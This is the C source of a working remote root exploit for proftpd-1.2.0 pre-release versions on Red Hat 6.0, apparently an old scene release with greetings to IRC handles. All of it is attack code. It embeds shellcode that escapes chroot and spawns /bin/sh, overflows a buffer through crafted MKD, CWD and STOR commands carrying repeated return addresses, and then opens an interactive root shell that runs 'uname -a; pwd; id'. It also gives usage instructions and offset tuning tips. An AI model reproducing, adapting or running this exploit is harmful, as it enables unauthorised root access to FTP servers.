/*
 * !!!! Private .. ... distribute !!!!
 *
 * <pro.c> proftpd-1.2.0 remote root exploit (beta2)
 * (Still need some code, but it works fine)
 *
 * Offset: Linux Redhat 6.0
 * 0 -> proftpd-1.2.0pre1 
 * 0 -> proftpd-1.2.0pre2
 * 0 -> proftpd-1.2.0pre3
 * (If this dont work, try changing the align)
 *
 * Usage:
 * $ cc pro.c -o pro
 * $ pro 1.1.1.1 ftp.linuz.com /incoming 
 *
 * ****
 * Comunists are still alive ph34r
 * A lot of shit to : #cybernet@ircnet
 * Greez to Soren,Draven,DaSnake,Nail^D0D,BlackBird,scaina,cliffo,m00n,phroid,Mr-X,inforic
 *          Dialtone,AlexB,naif,etcetc
 * without them this puppy cant be spreaded uaz uaz uaz
 * ****    
 *          

#include <stdio.h> 
#include <unistd.h>
#include <stdlib.h>
#include <signal.h>
#include <time.h>
#include <string.h>
#include <ctype.h>
#include <sys/types.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <arpa/nameser.h>
#include <netdb.h>

#define RET 0xbffff550
#define ALINEA 0

void logintoftp();
void sh();
void mkd(char *);
void put(char *);
int max(int, int);

char shellcode[] =
"\x90\x90\x31\xc0\x31\xdb\xb0\x17"
"\xcd\x80\x31\xc0\xb0\x17\xcd\x80"
"\x31\xc0\x31\xdb\xb0\x2e\xcd\x80"
"\xeb\x4f\x31\xc0\x31\xc9\x5e\xb0"
"\x27\x8d\x5e\x05\xfe\xc5\xb1\xed"
"\xcd\x80\x31\xc0\x8d\x5e\x05\xb0"
"\x3d\xcd\x80\x31\xc0\xbb\xd2\xd1"
"\xd0\xff\xf7\xdb\x31\xc9\xb1\x10"
"\x56\x01\xce\x89\x1e\x83\xc6\x03"
"\xe0\xf9\x5e\xb0\x3d\x8d\x5e\x10"
"\xcd\x80\x31\xc0\x88\x46\x07\x89"
"\x76\x08\x89\x46\x0c\xb0\x0b\x89"
"\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd"
"\x80\xe8\xac\xff\xff\xff";

char tmp[256];
char name[128], pass[128];

int sockfd;
struct sockaddr_in server, yo;
char inicio[20];

int main(int argc, char **argv) {

char sendln[1024], recvln[4048], buf1[1000], buf2[200];
struct hostent *host;
char *p, *q;
int len;
int offset = 0;
int align = 0;
int i;

if(argc < 4){
        printf("usage: pro <your_ip> <host> <dir> [-l name pass] [offset align]\n");
        printf("If dont work, try different align values (0 to 3)\n");
        exit(0); }
                
if(argc >= 5){
        if(strcmp(argv[4], "-l") == 0){
        strncpy(name, argv[5], 128);
        strncpy(pass, argv[6], 128);
} else {
        offset = atoi(argv[4]); }
        if(argc == 9)
        offset = atoi(argv[7]);
        align = atoi(argv[8]); }
        
sprintf(inicio, "%s", argv[1]);
                
if(name[0] == 0 && pass[0] == 0){
        strcpy(name, "anonymous");
        strcpy(pass, "a@a.es"); }

bzero(&server,sizeof(server));
bzero(recvln,sizeof(recvln));
bzero(sendln,sizeof(sendln));
server.sin_family=AF_INET;
server.sin_port=htons(21);

if((host = gethostbyname(argv[2])) != NULL) {
        bcopy(host->h_addr, (char *)&server.sin_addr, host->h_length);
} else {
        if((server.sin_addr.s_addr = inet_addr(argv[2]))<1) {
                perror("Obteniendo ip");
                exit(0); }
        }

bzero((char*)&yo,sizeof(yo));
yo.sin_family = AF_INET;

if((sockfd = socket(AF_INET, SOCK_STREAM, 0)) < 0){
        perror("socket()");
        exit(0); }

if((bind(sockfd, (struct sockaddr *)&yo, sizeof(struct sockaddr)))<0) {
        perror("bind()");
        exit(0); }

if(connect(sockfd, (struct sockaddr *)&server, sizeof(server)) < 0){
        perror("connect()");
        exit(0); }
        
printf("Destination_ip: %s \nDestination_port: %d\nSource_ip: %s \nSource_port: %d\n",
inet_ntoa(server.sin_addr), ntohs(server.sin_port), inet_ntoa(yo.sin_addr),
ntohs(yo.sin_port));
        
printf("Connected\n");
getchar();
               
while((len = read(sockfd, recvln, sizeof(recvln))) > 0){
        recvln[len] = '\0';
        if(strchr(recvln, '\n') != NULL)
        break; }
                        
logintoftp(sockfd);
printf("Logged\n");
bzero(sendln, sizeof(sendln));

memset(buf1, 0x90, 800);
memcpy(buf1, argv[3], strlen(argv[3]));
mkd(argv[3]);
p = &buf1[strlen(argv[3])];
q = &buf1[799];
*q = '\x00';
while(p <= q) {
        strncpy(tmp, p, 100);
        mkd(tmp);
        p+=100; }

mkd(shellcode);
mkd("bin");
mkd("sh");

memset(buf2, 0x90, 100);
for(i=4-ALINEA-align; i<96; i+=4)
        *(long *)&buf2[i] = RET + offset;
p = &buf2[0];
q = &buf2[99];
strncpy(tmp, p, 100);
put(tmp);

sh(sockfd);

close(sockfd);
printf("EOF\n");
}

void mkd(char *dir) {
        
char snd[1024], rcv[1024];
char buf[1024], *p;
int n;
        
bzero(buf,sizeof(buf));
p=buf;

for(n=0;n<strlen(dir);n++) {
        if(dir[n]=='\xff') {
                *p='\xff';
                p++; }
        *p=dir[n];
        p++; }

sprintf(snd,"MKD %s\r\n",buf);
write(sockfd,snd,strlen(snd));
bzero(snd,sizeof(snd));
sprintf(snd,"CWD %s\r\n",buf);
write(sockfd,snd,strlen(snd));
bzero(rcv,sizeof(rcv));

while((n=read(sockfd,rcv,sizeof(rcv)))>0) {
        rcv[n]=0;
        if(strchr(rcv,'\n')!=NULL)
                break; }
        return;
}

void put(char *dir) {

char snd[1024], rcv[1024];
char buf[1024], *p;
int n;
int sockete, nsock;
int port;
int octeto_in[4];
char *oct;
        
port=getpid()+1024;

yo.sin_port=htons(port);
        
bzero(buf,sizeof(buf));
p=buf;
for(n=0;n<strlen(dir);n++) {
        if(dir[n]=='\xff') {
                *p='\xff';
                p++; }
        *p=dir[n];
        p++; }

oct=(char *)strtok(inicio,".");
octeto_in[0]=atoi(oct);
oct=(char *)strtok(NULL,".");
octeto_in[1]=atoi(oct);
oct=(char *)strtok(NULL,".");
octeto_in[2]=atoi(oct);
oct=(char *)strtok(NULL,".");
octeto_in[3]=atoi(oct);

sprintf(snd,"PORT %d,%d,%d,%d,%d,%d\r\n",octeto_in[0],octeto_in[1],
octeto_in[2],octeto_in[3],port / 256,port % 256);
write(sockfd,snd,strlen(snd));

// socket
// bind
// listen
if((sockete=socket(AF_INET,SOCK_STREAM,IPPROTO_TCP))==-1) {
        perror("Socket()");
        exit(0); }
                        
if((bind(sockete,(struct sockaddr *)&yo,sizeof(struct sockaddr)))==-1) {
        perror("Bind()");
        close(sockete);
        exit(0); }

if(listen(sockete,10)==-1) {
        perror("Listen()");
        close(sockete);
        exit(0); }

bzero(snd, sizeof(snd));
sprintf(snd, "STOR %s\r\n", buf);
write(sockfd, snd, strlen(snd));

// accept
// write
// close 
if((nsock=accept(sockete,(struct sockaddr *)&server,(int *)sizeof(struct sockaddr)))==-1) {
        perror("accept()");
        close(sockete);
        exit(0); }
        
write(nsock, "aaaaaaaaa", 10);
 
close(sockete);
close(nsock);

bzero(rcv, sizeof(rcv));
while((n = read(sockfd, rcv, sizeof(rcv))) > 0){
        rcv[n] = 0;
        if(strchr(rcv, '\n') != NULL)
                break; }
        return; 
}

void logintoftp() {

char snd[1024], rcv[1024];
int n;

printf("Logging %s/%s\n", name, pass);
memset(snd, '\0', 1024);
sprintf(snd, "USER %s\r\n", name);
write(sockfd, snd, strlen(snd));

while((n=read(sockfd, rcv, sizeof(rcv))) > 0){
        rcv[n] = 0;
        if(strchr(rcv, '\n') != NULL)
                break; }

memset(snd, '\0', 1024);
sprintf(snd, "PASS %s\r\n", pass);
write(sockfd, snd, strlen(snd));

while((n=read(sockfd, rcv, sizeof(rcv))) > 0){
        rcv[n] = 0;
        if(strchr(rcv, '\n') != NULL)
                break; }
        return;
}

void sh() {
        
char snd[1024], rcv[1024];
fd_set rset;
int maxfd, n;

strcpy(snd, "cd /; uname -a; pwd; id;\n");
write(sockfd, snd, strlen(snd));

for(;;){
        FD_SET(fileno(stdin), &rset);
        FD_SET(sockfd, &rset);
        maxfd = max(fileno(stdin), sockfd) + 1;
        select(maxfd, &rset, NULL, NULL, NULL);
        if(FD_ISSET(fileno(stdin), &rset)){
                bzero(snd, sizeof(snd));
                fgets(snd, sizeof(snd)-2, stdin);
                write(sockfd, snd, strlen(snd)); }
        if(FD_ISSET(sockfd, &rset)){
                bzero(rcv, sizeof(rcv));
                if((n = read(sockfd, rcv, sizeof(rcv))) == 0){
                        printf("EOF.\n");
                        exit(0); }
                if(n < 0){
                        perror("read()");
                        exit(-1); }
                 fputs(rcv, stdout); }
        }
}

int max(int x, int y) {

if(x > y)
        return(x);
else
        return(y);
}
